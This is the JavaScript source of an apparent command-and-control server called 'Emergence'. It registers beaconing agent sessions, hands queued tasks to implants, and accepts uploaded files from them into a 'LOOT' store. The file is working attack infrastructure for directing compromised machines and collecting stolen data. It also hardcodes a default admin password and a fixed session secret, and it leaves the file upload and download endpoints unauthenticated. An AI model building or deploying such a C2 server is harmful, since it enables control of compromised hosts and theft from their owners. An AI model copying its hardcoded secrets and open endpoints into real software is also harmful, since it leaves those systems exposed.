console.log('Starting Emergence...');

const express = require('express');
const bcrypt = require('bcrypt');
const passport = require('passport');
const Strategy = require('passport-local').Strategy;
const bodyParser = require('body-parser');
const { exec } = require('child_process');
const multer = require('multer');
const url = require('url');

const MongoClient = require('mongodb').MongoClient;
const mongo = require('mongodb');

var db

//MongoClient.connect('mongodb://localhost:27017', (err, client) => {
MongoClient.connect('mongodb://mongo:27017', (err, client) => {
  if (err) { return console.log(err); }
  db = client.db('prismatica'); // whatever your database name is
  // Check if default user exists and update as needed
  const users = db.collection('users');
  users.find({username:"admin"}).limit(1).toArray((err, result) => {
    if (err) { console.log(err); return cb(err); }
    if (!result) { console.log("No result found"); return cb(null, false); }
    else {
      if(result.length === 0) {
        console.log('Adding default \'admin\' user');
        bcrypt.hash('asdfasdf', 10, (err, bcryptedPassword) => {
          const defaultAdmin = {
            username: 'admin',
            password: bcryptedPassword
          };
          users.insert(defaultAdmin);
        });
      }
      console.log("Successfully added default user");
    }
  });

  if (err) return console.log(err)
  db = client.db('prismatica') // whatever your database name is
  app.listen(29001, () => {
    console.log('listening on 29001')
  })
})

passport.use(new Strategy(
  function(username, password, cb) {
    const sess = db.collection('users');
    sess.find({username:username}).limit(1).toArray((err, result) => {
      if (err) { return cb(err); }
      if (!result) { return cb(null, false); }
      // //to compare password that user supplies in the future
      var hash = result[0].password;
      bcrypt.compare(password, hash, function(err, doesMatch){
       if (doesMatch){
          //log in
          return cb(null, result[0]);
       }else{
          //go away
          return cb(null, false);
       }
      });
    });
}));

passport.serializeUser((user, cb) => {
  cb(null, user._id);
});

passport.deserializeUser((id, cb) => {
    const sess = db.collection('users');
    const o_id = new mongo.ObjectID(id);
    //console.log(id);
    sess.find({"_id":o_id}).limit(1).toArray((err, result) => {
      if (err) { return cb(err); }
      return cb(null, result[0]);
    });
});

const app = express();
//app.use(require('morgan')('combined'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
// NEED TO GENERATE A SECRET RANDOMLY
app.use(require('express-session')({ secret: 'keyboard cat', resave: false, saveUninitialized: false }));

// Initialize Passport and restore authentication state, if any, from the
// session.
app.use(passport.initialize());
app.use(passport.session());

app.get('/', function(req, res) {
  res.send('Hello World')
})

app.get('/requires-session',
  require('connect-ensure-login').ensureLoggedIn(),
  (req, res) => {
    var response = { status: "you had a valid session!"};
    res.send(response);
});

app.post('/login',
passport.authenticate('local', { failureRedirect: '/login' }),
(req, res) => {
  var response = { status: "login success"};
  res.send(response);
});

app.get('/login',
(req, res) => {
  var response = { status: "failed login"};
  res.send(response);
});

app.post('/hash',
  (req, res) => {
    bcrypt.hash(req.body.data, 10, (err, bcryptedPassword) => {
      var response = { hash: bcryptedPassword };
      res.send(response);
    });
  }
);

//Get API data
app.post('/api/get/', require('connect-ensure-login').ensureLoggedIn(), (req, res) => {

  // Determine query type
  //console.log(req.body)
  //console.log("GET")

  // If query == Get Tasks
  if (req.body.collection == "TASK") {

    const sess = db.collection('SESSIONS');
    sess.find({agentid:req.body.agentid}).limit(1).toArray(function (err, result) {
        if (err) throw err
        //console.log(result);
        // IF beacon... new session?
        if (result[0] == null) {
          console.log("New Session Detected");
          var sessionDetails = {
            agentid: req.body.agentid,
            type: "Gryf",
            user: "ozymandias\\0zm0z1z",
            delay: 5,
            last: Date.now()
          }
          sess.save(sessionDetails, (err, result) => {
            if (err) return console.log(err)
        })
      } else {
        //Update Session Details
        //var ll = Date.now() - result[0].last
        var newlast = {$set: {last: Date.now()} }
        sess.update({agentid:req.body.agentid}, newlast, function(err, res) {
          if (err) throw err;
        });
      }
    })



    // Get tasks for agentId
    const collection = db.collection('TASK');
    collection.find({agentid:req.body.agentid}).limit(1).sort({_id: -1}).toArray(function (err, result) {
        if (err) throw err
        //console.log(result[0])
        res.json(result[0])
    })
  }
  else {
    res.send({});
  }
})

//TASK Agent
app.post('/api/task/', require('connect-ensure-login').ensureLoggedIn(), (req, res) => {
  console.log(req.body)
  const collection = db.collection('TASK');
  collection.save(req.body, (err, result) => {
    if (err) return console.log(err)
  })
  res.send({});
})

//Set API data
app.post('/api/update/', require('connect-ensure-login').ensureLoggedIn(), (req, res) => {
  const collection = db.collection('C2');
  console.log(req.body)
  collection.insertOne(req.body, (err, result) => {
    if (err) return console.log(err)
  })
  res.send({});
})

//Get API data
app.post('/api/c2/', require('connect-ensure-login').ensureLoggedIn(), (req, res) => {
  // Determine query type
  //console.log(req.body)
  //console.log("C2")

  // If query == Get Tasks
  if (req.body.collection == "C2") {
    // Get tasks for agentId
    const collection = db.collection('C2');
    collection.find().limit(1).sort({_id: -1}).toArray(function (err, result) {
        if (err) throw err
        //console.log(result[0])
        res.json(result[0])
    })
  }
  else {
    res.send({});
  }
})

//Session Data
app.post('/api/sessions/', require('connect-ensure-login').ensureLoggedIn(), (req, res) => {
  //console.log(req.body)
  const collection = db.collection('SESSIONS');
  collection.find().toArray(function (err, result) {
      if (err) throw err
      //console.log(result)
      res.json(result)
  })
})

//Download File
//Need to add auth... Issue is the Diagon renderer function... store session cookie in settings.json???
app.get('/api/dl/*', (req, res) => {
  console.log(req.body)
  console.log(req.url)
  var path = url.parse(req.url).pathname
  console.log(path.split('/'))
  const file = 'data/' + path.split('/')[path.split('/').length-1];
  res.download(file); // Set disposition and send it.

})

//Upload file
var filename = ''
var storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'data')
  },
  filename: function (req, file, cb) {
    filename = file.originalname.split(".")[0] + '-' + Date.now() + "." + file.originalname.split(".")[1]
    cb(null, filename)
  }
})

var upload = multer({ storage: storage })

app.post('/api/up/', upload.single('filename'), (req, res, next) => {
  const file = req.file
  if (!file) {
    const error = new Error('Please upload a file')
    error.httpStatusCode = 400
    return next(error)
  }
  res.send(file)
  const collection = db.collection('LOOT');


  var loot = {
    "name": filename
  }
  console.log(loot)
  collection.save(loot, (err, result) => {
    if (err) return console.log(err)
  })
})

//Loot Data
app.post('/api/loot/', require('connect-ensure-login').ensureLoggedIn(), (req, res) => {
  //console.log(req.body)
  const collection = db.collection('LOOT');
  collection.find().toArray(function (err, result) {
      if (err) throw err
      //console.log(result)
      res.json(result)
  })
})

//Add junk to db
app.post('/stockdata', (req, res) => {

})
